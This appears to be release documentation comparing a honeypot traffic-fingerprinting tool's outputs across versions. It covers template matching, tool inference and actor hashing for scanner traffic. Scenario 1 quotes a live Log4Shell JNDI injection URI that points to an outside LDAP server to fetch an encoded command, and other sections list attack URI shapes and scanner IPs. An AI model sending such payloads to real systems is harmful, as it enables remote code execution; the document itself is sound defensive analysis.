# Before / after: actual outputs

Verbatim outputs from the 1.0.0 worktree (`d6dee5b`), the unreleased
anchoring-only candidate, and the 2.0.0 release commit; same corpus, same
inputs. Base64 payloads elided with `…`.

## Scenario 1 — Log4Shell sprayer, 116 events, no Nuclei UA, self-hosted LDAP

Input URI (all 116 events share this shape):

```
/?x=${jndi:ldap://195.54.160.149:12344/Basic/Command/Base64/KGN1…}
```

### lookup

```
1.0.0
  UNIQUE  open-proxy-internal      //19    high  Open Proxy To Internal Network
  UNIQUE  httpbin-xss              e64/    high  HTTPBin - Cross-Site Scripting
anchoring only
  UNIQUE  landray-eis-ws-infoleak  Basic   high  Landray EIS ...   medium
2.0.0
  NO_MATCH
```

### fingerprint

```
1.0.0                                    2.0.0
structural_hash: sha256:e4524c23…        structural_hash: sha256:698c7706…
                                         low_signal: true
tool_inference:                          tool_inference:
  likely_tool: nuclei                      likely_tool: unknown
  confidence: 0.6                          confidence: 0.5
  signals:                                 signals: []
    - traffic matched 2 known Nuclei
      template(s)
inferred_cli_options:                    inferred_cli_options:
  -severity: [high]                        -severity: []
  -tags: [vuln]                            -tags: null
  -rate-limit: 2.0                         -rate-limit: 2.0
  -scan-strategy: mixed                    -scan-strategy: null
template_preference:                     template_preference:
  matched: [httpbin-xss,                   matched: []
            open-proxy-internal]           weak_only_matches: []
  hits_by_template:
    open-proxy-internal: 116
    httpbin-xss: 116
```

The anchoring-only candidate produced `likely_tool: nuclei`, `confidence:
0.6`, `-severity: [high]`, `-tags: [eis, info-leak, landray, vuln]`, and
`matched: [landray-eis-ws-infoleak]` for the same input; `Basic` is now
stopped as a common word and the template resolves on `WS/Basic`.

## Scenario 2 — nine signal-poor sprayers

Nine actors (15–38 events each) with no template hits in any version.

```
                   1.0.0 hash   2.0.0 hash   low_signal  -rate-limit  UA shapes / URI shapes
1.179.247.182      ec2f0f3d     c991453c     true        2.0
108.61.210.108     ec2f0f3d     d11fdca6     true        2.0
167.71.175.10      ec2f0f3d     ae027bfe     true        2.0          identical to 170.210.45.163
170.210.45.163     ec2f0f3d     ae027bfe     true        2.0          identical to 167.71.175.10
164.52.53.163      ec2f0f3d     1f08c970     true        1.0          identical to 34.65.121.142
34.65.121.142      ec2f0f3d     1f08c970     true        1.0          identical to 164.52.53.163
189.188.33.125     ec2f0f3d     422f0484     true        1.0
195.110.6.48       ec2f0f3d     13809c71     true        3.0
86.109.208.194     ec2f0f3d     1f5ce162     true        1.0
```

Representative 2.0.0 fingerprint (`1.179.247.182`):

```
actor_fingerprint:
  id: "actor-c991453c…"
  low_signal: true
  events_analyzed: 20
  tool_inference:
    likely_tool: "unknown"
    confidence: 0.5
    signals: []
  inferred_cli_options:
    -severity: []
    -tags: null
    -rate-limit: 2.0
    -scan-strategy: null
  template_preference:
    matched: []
    weak_only_matches: []
```

One shared hash becomes seven among the nine. The two pairs that still
share a hash have the same User-Agent shape set, the same URI shape set
(`/` and `/${jndi:ldap://A:N/Exploit}`), and the same inferred rate limit.
`compare` on any two of the nine returns at most 0.5 because both sides
are `low_signal`.

## Scenario 3 — galah honeypot, 62 URIs

```
1.0.0:           37 UNIQUE rows; 33 of 34 distinct snippets 4–5 bytes (at.j, laca, dns-, ci/;, edis, on-3, …)
anchoring only:  23 UNIQUE, 1 WEAK
2.0.0:           18 UNIQUE, 3 WEAK
                 strong: dns-query ×2, telescope, pools/default, aws/credentials, /password.php,
                         pearcmd&+config-create, geoserver/wms, /Autodiscover, GponForm
                 medium: ;stok ×2, htm=1, cmd,, MyCRL, skk_set, /SDK, m3u8
                 weak:   eventin, ecp/ (mid-token in the URI), ovL3 (fallback fragment)
```

No ground truth exists for galah; the change is reported as counts and
snippets, not as true/false positives.
